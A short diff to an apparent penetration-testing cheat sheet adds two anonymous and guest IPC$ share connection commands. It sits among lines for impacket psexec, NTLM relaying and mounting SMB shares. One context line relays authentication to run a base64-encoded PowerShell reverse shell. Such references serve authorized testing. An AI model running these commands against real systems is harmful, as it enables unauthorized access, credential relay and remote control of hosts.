@@ -510,6 +510,8 @@ $ impacket-psexec <username>:'<password>'@<IP address>
 $ psexec.py <domain>/<username>:'<password>'@<IP address>
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>        # Ensure SMB = Off in /etc/responder/Responder.conf, and 
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address> -c 'powershell -e <base64 reverse shell>
+C:\> net use \\<hostname>\ipc$ "" /u:""
+C:\> net use \\<hostname>\ipc$ "" /u:guest
 C:\> net use n: \\<IP address>\<share name>
 C:\> net use n: \\<IP address>\<share name> /user:<username> <password>
 PS C:\> New-PSDrive -Name "N" -Root "\\<IP address>\<share name>" -PSProvider "FileSystem"
